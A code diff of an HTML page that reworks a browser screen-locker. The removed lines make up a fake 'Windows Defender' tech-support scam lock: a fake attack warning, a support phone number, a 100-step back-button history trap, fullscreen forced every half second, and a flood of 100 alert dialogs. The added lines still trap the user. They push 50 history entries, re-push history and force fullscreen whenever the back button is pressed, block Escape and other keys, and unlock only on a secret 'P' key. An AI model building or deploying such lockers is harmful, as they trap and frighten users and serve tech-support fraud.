@@ -3,7 +3,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Persistent Security Lock</title>
+  <title>Secure Lock with Back Alert</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     html, body {
@@ -12,19 +12,19 @@
       background-color: #000;
       color: #fff;
       font-family: Arial, sans-serif;
-      text-align: center;
       overflow: hidden;
     }
-    .overlay {
+    .popup {
       position: fixed;
       top: 0; left: 0;
-      width: 100%; height: 100%;
+      width: 100vw; height: 100vh;
       background: #111;
-      z-index: 99999;
+      z-index: 9999;
       display: flex;
       flex-direction: column;
       justify-content: center;
       align-items: center;
+      text-align: center;
       padding: 20px;
     }
     h1 {
@@ -33,36 +33,27 @@
     }
     p {
       font-size: 16px;
-      margin-top: 10px;
+      margin: 10px 0;
     }
   </style>
   <script>
-    let alertFlood = true;
-    let alertCount = 0;
-
-    // Deep pushState to trap back button
-    for (let i = 0; i < 100; i++) {
-      history.pushState({}, '', location.href + '#' + i);
-    }
-
     function forceFullscreen() {
       const el = document.documentElement;
       if (el.requestFullscreen) el.requestFullscreen().catch(() => {});
       else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
     }
 
-    function loopFullscreenForever() {
-      setInterval(() => {
-        forceFullscreen();
-      }, 500); // Every 0.5 second
-    }
-
-    document.addEventListener("DOMContentLoaded", () => {
-      loopFullscreenForever();
+    // Only 'P' key unlocks
+    document.addEventListener("keydown", function(e) {
+      if (e.key.toLowerCase() === "p") {
+        document.getElementById("popup").remove();
+        alert("✅ Popup removed with secret key.");
+      } else {
+        e.preventDefault();
+      }
     });
 
-    document.addEventListener("click", forceFullscreen);
-    document.addEventListener("touchstart", forceFullscreen);
+    // Prevent ESC
     document.addEventListener("keydown", function(e) {
       if (e.key === 'Escape') {
         e.preventDefault();
@@ -70,36 +61,31 @@
       }
     });
 
-    function showAlerts(n) {
-      if (n >= 100) {
-        alert("✅ 100 alerts shown. You may now exit.");
-        return;
-      }
-      setTimeout(() => {
-        forceFullscreen();
-        alertCount++;
-        alert(`🚫 Security Alert ${alertCount}/100\nSystem exit blocked.`);
-        history.pushState({}, '', location.href + '#' + Math.random());
-        forceFullscreen();
-        showAlerts(n + 1);
-      }, 100);
-    }
+    document.addEventListener("click", forceFullscreen);
+    document.addEventListener("touchstart", forceFullscreen);
 
-    window.onpopstate = function () {
-      if (alertFlood) {
-        alertFlood = false;
-        showAlerts(0);
+    // Deep history trap
+    document.addEventListener("DOMContentLoaded", () => {
+      forceFullscreen();
+      for (let i = 0; i < 50; i++) {
+        history.pushState({}, '', location.href + '#' + i);
       }
+    });
+
+    // Back button trap with alert
+    window.onpopstate = function () {
+      alert("🚫 Back button is disabled!");
+      history.pushState({}, '', location.href + '#' + Math.random());
+      forceFullscreen();
     };
   </script>
 </head>
 <body>
-  <div class="overlay">
-    <h1>⚠️ Windows Defender - Critical Lock</h1>
-    <p>Your system is under attack!</p>
-    <p>Call Support Immediately: <strong>+1-800-FAKE-NUM</strong></p>
-    <p><strong>This screen will stay locked in fullscreen until 100 security alerts are acknowledged.</strong></p>
-    <p>Tap anywhere to activate and maintain fullscreen mode.</p>
+  <div class="popup" id="popup">
+    <h1>🔒 Security Lock</h1>
+    <p>This screen is protected.</p>
+    <p>Back/ESC won't exit fullscreen.</p>
+    <p><strong>Press <code>P</code> to unlock this screen.</strong></p>
   </div>
 </body>
 </html>
